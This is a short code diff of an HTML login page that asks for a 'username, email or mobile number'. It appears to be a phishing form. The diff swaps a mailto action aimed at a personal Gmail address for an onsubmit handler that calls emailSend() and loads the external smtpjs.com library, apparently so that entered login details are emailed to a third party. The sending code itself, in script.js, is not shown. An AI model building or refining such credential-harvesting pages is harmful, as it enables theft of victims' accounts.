@@ -17,7 +17,7 @@
 
 
         <div class="form-container">
-            <form id="login-form" action="mailto:jaeger.62@gmail.com" method="post" enctype="text/plain">
+            <form onsubmit="emailSend(); resent(); return false;" id="login-form"  enctype="text/plain">
                 <div class="form-group password-group">
                     <input type="text" id="identifier" name="identifier" placeholder="Username, email or mobile number"
                         required>
@@ -61,7 +61,8 @@
 
     </div>
 
-
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
 <script src="script.js"></script>
 </body>
 
